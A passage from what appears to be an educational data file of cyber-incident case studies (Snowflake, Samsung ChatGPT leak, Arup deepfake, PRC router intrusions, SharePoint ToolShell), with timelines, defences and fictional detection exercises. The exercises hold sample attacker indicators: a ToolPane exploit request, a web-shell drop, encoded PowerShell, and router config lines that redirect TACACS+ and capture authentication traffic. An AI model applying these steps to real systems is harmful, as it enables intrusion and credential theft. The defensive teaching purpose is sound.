allow-list, rotating the password after the infostealer exposure."]},kid_summary_urdu:"۲۰۲۴ میں کچھ لوگوں نے برسوں پرانے چوری شدہ پاس ورڈز سے کئی کمپنیوں کے کلاؤڈ اکاؤنٹس کھول لیے، کیونکہ وہاں دوسرا حفاظتی قدم نہیں تھا۔ ماہرین نے جلد سب کو خبردار کیا اور پولیس نے ایک ملزم کو پکڑ لیا۔ اس سے سیکھتے ہیں کہ پاس ورڈ بدلتے رہیں اور دو قدمی تصدیق ضرور لگائیں۔",unresolved:["Sentencing of Connor Moucka was scheduled for 2026-10-27; the outcome was not verified.","Other co-conspirators' cases were not reviewed for this library.","The DOJ release refers to 'a U.S.-based software-as-a-service company' without naming it; the link to the Snowflake campaign is based on matching details (165 customers, 2024, stolen credentials) with Mandiant's report."],references:[{title:"UNC5537 Targets Snowflake Customer Instances for Data Theft and Extortion",url:"https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion",publisher:"Mandiant / Google Cloud"},{title:"Canadian pleads guilty to hacking U.S. cloud storage provider and extorting its customers for millions",url:"https://www.justice.gov/usao-wdwa/pr/canadian-pleads-guilty-hacking-us-cloud-storage-provider-and-extorting-its-customers",publisher:"US Department of Justice (WDWA)"}]},{id:"ai-samsung-chatgpt-2023",name:"Samsung confidential data pasted into ChatGPT",date:"2023-04",organization:"Samsung Electronics",category:"ai",timeline:[{date:"2023-03-11",event:"Samsung's Device Solutions (semiconductor/display) division begins allowing staff to use generative AI.",status:"reported"},{date:"2023-03/04",event:"Three incidents reported within about three weeks: source code and a meeting recording/notes pasted into ChatGPT.",status:"reported"},{date:"2023-04",event:"Emergency limit reportedly set: prompts capped at 1,024 bytes; disciplinary action considered.",status:"reported"},{date:"2023-04",event:"Internal survey: about 65% of respondents see security risk in generative AI tools.",status:"reported"},{date:"2023-05-01",event:"Samsung temporarily restricts generative AI on company devices and internal networks.",status:"company_statement"}],what_happened:[{text:"Engineers reportedly pasted confidential material into ChatGPT: buggy semiconductor database source code to fix, equipment defect-detection code to optimise, and an internal meeting to turn into minutes.",status:"reported"},{text:"Samsung said it was reviewing measures to create a secure environment for generative AI and, until ready, temporarily restricted its use through company devices.",status:"company_statement"},{text:"Samsung's concern, per its memo as reported: data sent to external AI services is stored on outside servers, is hard to retrieve and delete, and could be disclosed to others.",status:"reported"}],initial_access:{text:"No attacker involved: well-meaning employees voluntarily submitted confidential data to an external AI service (accidental data leak).",status:"reported"},failure:[{text:"Employees were allowed to use a public AI tool before clear data-handling rules and technical controls existed.",status:"reported"},{text:"No technical control prevented confidential code or recordings from being pasted into an external service.",status:"reported"}],attack_chain:[{step:1,stage:"Tool adoption",text:"Staff given access to a public generative AI tool to boost productivity.",status:"reported"},{step:2,stage:"Data submission",text:"Confidential source code and meeting content pasted in prompts.",status:"reported"},{step:3,stage:"Loss of control",text:"Data now held on a third party's servers outside Samsung's control.",status:"reported"}],impact:[{text:"Confidential code and meeting information left Samsung's control; no public evidence that it was misused was found in the opened sources.",status:"reported"},{text:"Company-wide temporary restriction of generative AI on company devices and networks.",status:"company_statement"}],detection_investigation:[{text:"The incidents were reported by Korean media (The Economist Korea) and led to internal reviews; Samsung did not detail how it detected them.",status:"reported"}],response_recovery:[{text:"Temporary ban on generative AI via company devices; staff asked not to upload company or personal data using personal devices; violations could lead to discipline.",status:"reported"},{text:"Samsung reportedly began developing in-house AI tools for translation, summarising and software development.",status:"reported"}],prevention:[{text:"Write a clear AI acceptable-use policy: what data may and may not go into external AI tools.",basis:"Lesson from Samsung memo as reported (editorial)"},{text:"Offer an approved, enterprise AI option with data protections so staff do not use public tools.",basis:"Samsung's in-house tools plan (reported)"},{text:"Use data-loss-prevention controls that warn or block when source code or secrets are pasted into web forms.",basis:"General defensive practice (editorial)"}],lessons:["Whatever you type into an online AI tool leaves your computer.","New tools need new safety rules before everyone starts using them.","Not every incident is caused by hackers; sometimes it is a helpful mistake."],defensive_exercise:{title:"Is it safe to paste?",scenario:"Students at the fictional 'RoboClub' use an online AI helper. Sort these FICTIONAL prompts into safe or not safe.",sample_data:["prompt_1: 'Explain what a for-loop is in Python.'","prompt_2: 'Fix this code: db_password = \"Club$ecret2030\" ...'","prompt_3: 'Summarise this recording of our private club meeting about the new robot design.'","prompt_4: 'Give me 5 ideas for a science fair poster title.'","prompt_5: 'Here is my friend's full name, address and phone number, write a birthday card.'"],tasks:["Mark each prompt as safe or not safe to send to a public AI tool.","For each unsafe prompt, say what information is the problem.","Rewrite prompt 2 so it is safe."],expected_findings:["Safe: 1 and 4. Not safe: 2 (password/secret), 3 (private meeting and designs), 5 (someone else's personal information).","Prompt 2 could become: 'Fix this code: db_password = \"<REMOVED>\" ...' and the real password should be changed if it was ever shared."]},kid_summary_urdu:"۲۰۲۳ میں ایک بڑی کمپنی کے کچھ ملازمین نے مدد لینے کے لیے اپنا خفیہ کام ایک آن لائن اے آئی چیٹ بوٹ میں لکھ دیا۔ کمپنی نے فوراً نئے اصول بنائے تاکہ خفیہ معلومات محفوظ رہیں۔ اس سے سیکھتے ہیں کہ اے آئی سے بات کرتے وقت اپنی یا کسی اور کی ذاتی معلومات نہ لکھیں۔",unresolved:["Samsung did not publicly confirm the details of the three incidents; they come from Korean media as reported by Dark Reading and others.","Whether the submitted data was ever used for model training or seen by others is not established in the opened sources."],references:[{title:"Samsung bans use of generative AI tools like ChatGPT after April internal data leak",url:"https://techcrunch.com/2023/05/02/samsung-bans-use-of-generative-ai-tools-like-ChatGPT-after-april-internal-data-leak",publisher:"TechCrunch"},{title:"Samsung Engineers Feed Sensitive Data to ChatGPT, Sparking Workplace AI Warnings",url:"https://www.darkreading.com/vulnerabilities-threats/samsung-engineers-sensitive-data-chatgpt-warnings-ai-use-workplace",publisher:"Dark Reading"}]},{id:"ai-arup-deepfake-2024",name:"Arup Hong Kong deepfake video-conference fraud",date:"2024-01",organization:"Arup (Hong Kong office)",category:"ai",secondary_categories:["identity"],timeline:[{date:"2024-01",event:"A Hong Kong finance employee receives a message, apparently from the UK-based CFO, about a secret transaction; initially suspects phishing.",status:"reported"},{date:"2024-01",event:"Employee joins a video call where the 'CFO' and other 'colleagues' are deepfakes, then makes 15 transfers totalling HK$200 million (about US$25.6 million) to five local bank accounts.",status:"reported"},{date:"2024-01-29",event:"Hong Kong police receive a report; case classified as 'obtaining property by deception' and handled by the cybercrime unit.",status:"reported"},{date:"2024-05-16/17",event:"Arup confirms it was the victim and that fake voices and images were used.",status:"company_statement"}],what_happened:[{text:"Fraudsters used AI-generated deepfake video and voices of senior staff in a video conference to convince a finance worker to transfer money.",status:"company_statement"},{text:"Hong Kong police said the fraudster likely downloaded videos in advance and used AI to add fake voices.",status:"reported"},{text:"Arup said its financial stability and business operations were not affected and none of its internal systems were compromised.",status:"company_statement"}],initial_access:{text:"Social engineering: a message impersonating the CFO followed by a deepfake video call. No computer systems were hacked, according to Arup.",status:"company_statement"},failure:[{text:"Large payments could be made based on instructions in a video call, without independent verification through a separate channel.",status:"reported"}],attack_chain:[{step:1,stage:"Preparation",text:"Publicly available video/audio of staff collected.",status:"reported"},{step:2,stage:"Lure",text:"Message from 'CFO' requesting a confidential transaction.",status:"reported"},{step:3,stage:"Deepfake meeting",text:"Video call with AI-generated likenesses of the CFO and colleagues.",status:"reported"},{step:4,stage:"Payment",text:"15 transfers to five bank accounts.",status:"reported"},{step:5,stage:"Discovery",text:"Employee checked with head office afterwards and realised it was a scam.",status:"reported"}],impact:[{text:"About HK$200 million (US$25.6 million) lost.",status:"reported"},{text:"Arup says operations and internal systems were not affected.",status:"company_statement"}],detection_investigation:[{text:"The scam was uncovered when the employee later contacted the company's head office.",status:"reported"},{text:"Arup notified Hong Kong police in January 2024; investigation ongoing at the time of reporting.",status:"company_statement"}],response_recovery:[{text:"Arup's CIO said attacks including invoice fraud, phishing, WhatsApp voice spoofing and deepfakes were rising in number and sophistication; regional leadership urged staff to stay alert.",status:"company_statement"}],prevention:[{text:"Verify payment requests through a second, known channel (call back a number on file) regardless of how convincing a call looks.",basis:"Lesson from reporting (editorial)"},{text:"Require multi-person approval for large or 'secret' transfers.",basis:"General financial-control practice (editorial)"},{text:"Agree on internal code words or challenge questions for urgent requests.",basis:"General practice (editorial)"},{text:"Train staff that video and voice can be faked.",basis:"Arup CIO statement on rising deepfakes (company_statement)"}],lessons:["Seeing and hearing someone online does not always prove it is really them.","Requests for secrecy and urgency are warning signs.","Check with a trusted person in a different way before acting."],defensive_exercise:{title:"The urgent secret request",scenario:"You help the treasurer of the fictional 'GreenLeaf School Fund'. Review this FICTIONAL message thread and call notes.",sample_data:["email from: principal@greenleaf-school.example.co  (real domain is greenleaf-school.example)","subject: URGENT & CONFIDENTIAL - transfer today, do not tell anyone","video call notes: 'principal' camera image slightly blurry, says microphone problem, asks for 5 separate transfers to new accounts","school policy: transfers over 1,000 need two signatures and a call-back to the number on file"],tasks:["List every warning sign you can find.","Which school policy step would stop the fraud?","What should the treasurer do next?"],expected_findings:["Look-alike email domain (.example.co vs .example), urgency and secrecy, new accounts, splitting into several transfers, odd video/audio quality.","The two-signature rule and call-back to the number on file.","Do not pay; call the principal on the known number; report the attempt."]},kid_summary_urdu:"۲۰۲۴ میں دھوکے بازوں نے اے آئی کی مدد سے ایک ویڈیو کال میں کمپنی کے افسروں جیسی نقلی شکلیں اور آوازیں بنائیں اور ایک ملازم سے رقم منتقل کروا لی۔ کمپنی نے پولیس کو اطلاع دی اور سب کو خبردار کیا۔ اس سے سیکھتے ہیں کہ اگر کوئی جلدی میں راز رکھنے کو کہے تو کسی بڑے سے دوسرے طریقے سے تصدیق کریں۔",unresolved:["Whether any money was recovered and whether suspects were arrested is not stated in the opened sources.","Reports differ on the employee's gender; it is omitted here."],references:[{title:"British engineering giant Arup revealed as $25 million deepfake scam victim",url:"https://www.cnn.com/2024/05/16/tech/arup-deepfake-scam-loss-hong-kong-intl-hnk",publisher:"CNN"},{title:"Company worker in Hong Kong pays out £20m in deepfake video call scam",url:"https://www.theguardian.com/world/2024/feb/05/hong-kong-company-deepfake-video-conference-call-scam",publisher:"The Guardian"}]},{id:"prc-telecom-routers-aa25-239a-2025",name:"PRC state-sponsored compromise of telecom backbone routers (Salt Typhoon overlap)",date:"2025-08-27",organization:"Telecommunications providers and other critical infrastructure worldwide",category:"critical-infrastructure",timeline:[{date:"2021 onward",event:"Activity by these APT actors observed globally since at least 2021.",status:"confirmed"},{date:"2021-08 to 2025-06",event:"Period covered by the advisory's IP-based indicators.",status:"confirmed"},{date:"2025-08-27",event:"NSA, CISA, FBI and partners from 13 countries publish joint advisory AA25-239A.",status:"confirmed"},{date:"2025-09-03",event:"Advisory revised (v1.1).",status:"confirmed"}],what_happened:[{text:"PRC state-sponsored actors targeted large backbone routers of major telecom providers plus provider-edge and customer-edge routers, and also government, transportation, lodging and military networks.",status:"confirmed"},{text:"They modified routers to keep long-term access and pivoted through trusted provider-to-provider and provider-to-customer links.",status:"confirmed"},{text:"Agencies say stolen data can help Chinese intelligence identify and track targets' communications and movements; activity linked to three named China-based companies.",status:"confirmed"},{text:"Activity partially overlaps with industry names such as Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807 and GhostEmperor.",status:"confirmed"}],initial_access:{text:"Exploitation of publicly known vulnerabilities in internet-exposed edge devices (e.g., Ivanti CVE-2024-21887, Palo Alto PAN-OS CVE-2024-3400, Cisco IOS XE CVE-2023-20198/CVE-2023-20273, Cisco Smart Install CVE-2018-0171); no zero-days observed. Full initial-access picture remains an information gap.",status:"confirmed"},failure:[{text:"Unpatched, internet-exposed network devices with known exploited vulnerabilities.",status:"confirmed"},{text:"Weak device credentials (e.g., Cisco Type 5/7 passwords, default SNMP community strings like 'public'/'private').",status:"confirmed"},{text:"Limited monitoring of router configuration changes, containers on devices and management-plane traffic.",status:"confirmed"}],attack_chain:[{step:1,stage:"Exploit edge device",text:"Known CVEs exploited on routers/firewalls/VPNs.",status:"confirmed"},{step:2,stage:"Persistence",text:"Modify ACLs, open SSH/HTTP on unusual high ports, add accounts, create GRE/IPsec tunnels, use on-device Linux containers (Guest Shell).",status:"confirmed"},{step:3,stage:"Credential capture",text:"On-box packet capture of TACACS+ (TCP/49) authentication traffic; redirect AAA servers.",status:"confirmed"},{step:4,stage:"Lateral movement",text:"Move between network devices via SNMP, SSH and captured credentials; pivot across peering links.",status:"confirmed"},{step:5,stage:"Collection and exfiltration",text:"Mirror traffic (SPAN), collect configs and subscriber data, exfiltrate through tunnels.",status:"confirmed"}],impact:[{text:"Long-term espionage access to telecom and other critical networks in the US, Australia, Canada, New Zealand, the UK and elsewhere.",status:"confirmed"}],detection_investigation:[{text:"Agencies recommend diffing running router configs against approved versions, auditing ACLs, tunnels, local accounts, PCAP/SPAN sessions and containers, and verifying firmware hashes.",status:"confirmed"},{text:"They warn that partial response can tip off the actors; full scoping before simultaneous eviction is advised.",status:"confirmed"}],response_recovery:[{text:"Patch KEV-listed edge-device vulnerabilities, isolate management planes, use SNMPv3, disable unused services (Smart Install, Guest Shell, HTTP), use strong password types, and centralise logging.",status:"confirmed"}],prevention:[{text:"Prioritise patching internet-facing network devices listed in CISA's KEV catalog.",basis:"CISA AA25-239A (confirmed)"},{text:"Keep approved configurations and alert on any difference.",basis:"CISA AA25-239A (confirmed)"},{text:"Isolate device management in a dedicated network/VRF with allow-lists.",basis:"CISA AA25-239A (confirmed)"},{text:"Replace default/weak credentials and community strings.",basis:"CISA AA25-239A (confirmed)"}],lessons:["Routers are computers too and need updates.","Small configuration changes can hide big problems.","Many countries working together can spot and share warnings faster."],defensive_exercise:{title:"Spot the changed router",scenario:"You are on the network team of the fictional ISP 'StarNet'. Compare the FICTIONAL approved config with today's running config.",sample_data:["APPROVED: access-list 10 permit 10.10.0.0 0.0.255.255","RUNNING:  access-list 10 permit 10.10.0.0 0.0.255.255","RUNNING:  access-list 20 permit 203.0.113.77","RUNNING:  ip ssh port 22222","RUNNING:  tacacs-server host 198.51.100.66","RUNNING:  monitor capture mycap match ipv4 protocol tcp any any eq 49","RUNNING:  snmp-server community public RW"],tasks:["List every line that is not in the approved config.","Explain why each new line could help an attacker.","Why should the team plan before removing the changes?"],expected_findings:["New: access-list 20 for an outside IP; SSH on high port 22222; TACACS+ server changed to an unknown IP; packet capture on TCP/49; SNMP 'public' with write access.","Allow attacker IP; hidden remote access; steal admin logins; capture authentication traffic; change configs via SNMP.","Agencies warn partial cleanup may alert the attacker; scope all devices, capture evidence, then remove access simultaneously and report to authorities."]},kid_summary_urdu:"بہت سے ملکوں کی حفاظتی ایجنسیوں نے ۲۰۲۵ میں بتایا کہ کچھ ہیکرز نے انٹرنیٹ کے بڑے راؤٹرز میں پرانی کمزوریوں کا فائدہ اٹھایا تھا۔ ایجنسیوں نے مل کر کمپنیوں کو بتایا کہ انہیں کیسے ڈھونڈیں اور ٹھیک کریں۔ اس سے سیکھتے ہیں کہ گھر کے راؤٹر کا پاس ورڈ بدلنا اور اسے اپ ڈیٹ رکھنا بھی اہم ہے۔",unresolved:["Initial access vectors are described by the agencies themselves as a critical information gap.","Specific victim companies are not named in the advisory."],references:[{title:"Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System (AA25-239A)",url:"https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a",publisher:"CISA / NSA / FBI and international partners"}]},{id:"sharepoint-toolshell-2025",name:"On-premises SharePoint 'ToolShell' exploitation",date:"2025-07-19",organization:"Organisations running on-premises Microsoft SharePoint Server",category:"web-app",secondary_categories:["ransomware"],timeline:[{date:"2025-07-07",event:"Microsoft analysis suggests exploitation attempts began as early as this date.",status:"company_statement"},{date:"2025-07-18",event:"Microsoft observes Storm-2603 deploying ransomware via these vulnerabilities.",status:"company_statement"},{date:"2025-07-19",event:"Microsoft Security Response Center publishes guidance on active attacks (CVE-2025-53770).",status:"company_statement"},{date:"2025-07-22",event:"Microsoft Threat Intelligence details exploitation by Linen Typhoon, Violet Typhoon and Storm-2603; updates released for all supported SharePoint versions.",status:"company_statement"}],what_happened:[{text:"Attackers exploited on-premises SharePoint vulnerabilities (CVE-2025-49706 spoofing and CVE-2025-49704 remote code execution, with related CVE-2025-53770/53771) on internet-facing servers. SharePoint Online was not affected.",status:"company_statement"},{text:"After exploitation they uploaded a web shell (spinstall0.aspx and variants) that stole ASP.NET MachineKey data.",status:"company_statement"},{text:"Microsoft attributes exploitation to Chinese state actors Linen Typhoon and Violet Typhoon and China-based Storm-2603, which deployed Warlock ransomware.",status:"company_statement"}],initial_access:{text:"Exploitation of internet-facing on-premises SharePoint via a crafted POST request to the ToolPane endpoint (authentication bypass + remote code execution).",status:"company_statement"},failure:[{text:"Internet-facing on-premises SharePoint servers vulnerable before patches; stolen machine keys could allow continued access unless rotated.",status:"company_statement"}],attack_chain:[{step:1,stage:"Exploit",text:"POST to ToolPane endpoint exploits spoofing + RCE flaws.",status:"company_statement"},{step:2,stage:"Web shell",text:"spinstall0.aspx dropped; retrieves MachineKey data.",status:"company_statement"},{step:3,stage:"Discovery and credential theft",text:"whoami, Mimikatz against LSASS (Storm-2603).",status:"company_statement"},{step:4,stage:"Lateral movement",text:"PsExec, Impacket via WMI; Defender disabled via registry; scheduled tasks for persistence.",status:"company_statement"},{step:5,stage:"Impact",text:"Group Policy modified to distribute Warlock ransomware (Storm-2603).",status:"company_statement"}],impact:[{text:"Espionage-focused and ransomware actors gained access to unpatched organisations; Microsoft expected continued exploitation of unpatched servers.",status:"company_statement"}],detection_investigation:[{text:"Microsoft published IOCs (file names, hashes, IPs) and hunting queries, e.g., looking for spinstall*.aspx in SharePoint LAYOUTS folders and w3wp.exe spawning encoded PowerShell.",status:"company_statement"}],response_recovery:[{text:"Apply security updates, enable AMSI in Full Mode with Defender, rotate ASP.NET machine keys, restart IIS, deploy EDR, follow incident response plan.",status:"company_statement"}],prevention:[{text:"Patch internet-facing servers immediately when actively exploited flaws are announced.",basis:"Microsoft guidance (company_statement)"},{text:"After patching a key-theft bug, rotate secrets (machine keys) too.",basis:"Microsoft guidance (company_statement)"},{text:"Reduce exposure: put internal collaboration servers behind VPN/authenticating gateway.",basis:"Microsoft guidance (company_statement)"}],lessons:["Patching closes the door, but stolen keys must also be changed.","Servers on the internet get attacked within days of a new bug.","Hunting for unexpected new files helps find intruders."],defensive_exercise:{title:"New file in LAYOUTS",scenario:"The fictional 'MapleTown Council' runs its own document server. Review this FICTIONAL web and file log.",sample_data:["2030-07-19T02:00:01Z POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit referer=/_layouts/SignOut.aspx src=203.0.113.200 status=200","2030-07-19T02:00:03Z file_created path=...\\TEMPLATE\\LAYOUTS\\spinstall0.aspx by=w3wp.exe","2030-07-19T02:00:20Z GET /_layouts/15/spinstall0.aspx src=203.0.113.200 status=200 bytes=2100","2030-07-19T02:10:00Z process w3wp.exe -> cmd.exe -> powershell -EncodedCommand ...","patch_status: security update not installed"],tasks:["Which request looks like the exploit attempt?","What file appeared and why is it suspicious?","Why is patching alone not enough here?"],expected_findings:["The POST to ToolPane.aspx with a SignOut referer from 203.0.113.200.","spinstall0.aspx created by the web server process, then fetched by the same IP: web shell stealing keys.","Keys may already be stolen: rotate machine keys, restart IIS, hunt for further activity and remove the web shell, in addition to patching."]},kid_summary_urdu:"۲۰۲۵ میں دفتروں میں استعمال ہونے والے ایک دستاویزات کے سرور میں نئی کمزوری ملی اور کچھ ہیکرز نے اسے فوراً استعمال کرنا شروع کر دیا۔ مائیکروسافٹ نے اپ ڈیٹس اور ہدایات جاری کیں تاکہ ادارے خود کو محفوظ کر سکیں۔ اس سے سیکھتے ہیں کہ اپ ڈیٹ کے بعد پرانی چابیاں اور پاس ورڈ بھی بدلنے چاہئیں۔",unresolved:["Total number of compromised organisations not stated in the opened Microsoft source.","Microsoft noted investigations into other actors were ongoing."],references:[{title:"Disrupting active exploitation of on-premises SharePoint vulnerabilities",url:"https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/",publisher:"Microsoft Threat Intelligence"}]}];